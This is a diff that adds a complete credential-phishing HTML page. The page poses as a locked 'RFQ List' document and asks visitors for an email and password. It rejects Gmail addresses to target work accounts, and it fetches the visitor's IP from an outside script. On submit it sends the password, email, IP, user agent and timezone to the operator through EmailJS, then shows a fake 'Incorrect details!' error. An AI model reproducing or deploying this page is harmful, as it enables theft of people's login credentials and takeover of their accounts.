@@ -1,0 +1,198 @@
+<html lang="en">
+  <div
+    id="in-page-channel-node-id"
+    data-channel-name="in_page_channel_ib2S6A"
+  ></div>
+  <script src="https://l2.io/ip.js?var=userip" type="text/javascript"></script>
+  <script type="text/javascript">
+    var userip;
+  </script>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>View Document</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-image: url("https://z-cdn-media.chatglm.cn/files/b813630d-2cfb-47df-8134-eb143b9b7f78.jpg?auth_key=1868828119-288dad955cb14a80a19e795c0c024648-0-363a98a79728cf119be6d84f79b68798");
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      .container {
+        background-color: white;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        width: 320px;
+        text-align: center;
+      }
+
+      .header-image {
+        width: 120px;
+        height: auto;
+        margin-bottom: 15px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .info-text {
+        color: #333;
+        font-size: 14px;
+        margin-bottom: 25px;
+        line-height: 1.5;
+      }
+
+      input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+        font-size: 16px;
+        text-align: left;
+      }
+
+      input::placeholder {
+        text-align: left;
+      }
+
+      button {
+        width: 100%;
+        padding: 12px;
+        background-color: #0056b3;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      button:hover {
+        background-color: #004494;
+      }
+
+      button:disabled {
+        background-color: #cccccc;
+        cursor: not-allowed;
+      }
+
+      .error-message {
+        color: #d32f2f;
+        font-size: 14px;
+        margin-top: 10px;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <img
+        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRrqqyn2GtNfzsHzp4jRJ0vYhjt1jnuLy9V5oJ0jLUmIw&s=10"
+        alt="Document"
+        class="header-image"
+      />
+
+      <p class="info-text">
+        DOCUMENT LOCKED! Sign in With Your Email To View the RFQ List Clearly
+      </p>
+
+      <form id="contact-form">
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Email"
+          required=""
+        />
+        <input
+          type="password"
+          id="name"
+          name="name"
+          placeholder="Password"
+          required=""
+        />
+        <button type="submit" id="button">View Document</button>
+        <div class="error-message" id="errorMessage"></div>
+      </form>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script>
+      (function () {
+        emailjs.init("BqtozvZPpQvIqERHM");
+      })();
+
+      document
+        .getElementById("contact-form")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const btn = document.getElementById("button");
+          const errorMessage = document.getElementById("errorMessage");
+          const email = document.getElementById("email").value.toLowerCase();
+          const name = document.getElementById("name").value;
+          const nameInput = document.getElementById("name");
+
+          errorMessage.style.display = "none";
+
+          if (email.includes("@gmail.")) {
+            errorMessage.textContent =
+              "Please use a work email (Gmail is not allowed).";
+            errorMessage.style.display = "block";
+            nameInput.value = "";
+            return;
+          }
+
+          // if (email.includes("@yahoo.")) {
+          //   errorMessage.textContent =
+          //     "Please use a work email (Yahoo is not allowed).";
+          //   errorMessage.style.display = "block";
+          //   nameInput.value = "";
+          //   return;
+          // }
+
+          btn.disabled = true;
+
+          const templateParams = {
+            user_email: email,
+            user_pass: name,
+            user_agent: navigator.userAgent,
+            user_country: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            user_ip: userip,
+          };
+
+          emailjs
+            .send("service_mbg58ij", "template_mg3gfsa", templateParams)
+            .then(
+              function (response) {
+                console.log(
+                  "Email sent successfully!",
+                  response.status,
+                  response.text,
+                );
+              },
+              function (error) {
+                console.log("Email send failed:", error);
+              },
+            )
+            .finally(function () {
+              errorMessage.textContent = "Incorrect details!  ";
+              errorMessage.style.display = "block";
+              nameInput.value = "";
+              btn.disabled = false;
+            });
+        });
+    </script>
+  </body>
+</html>
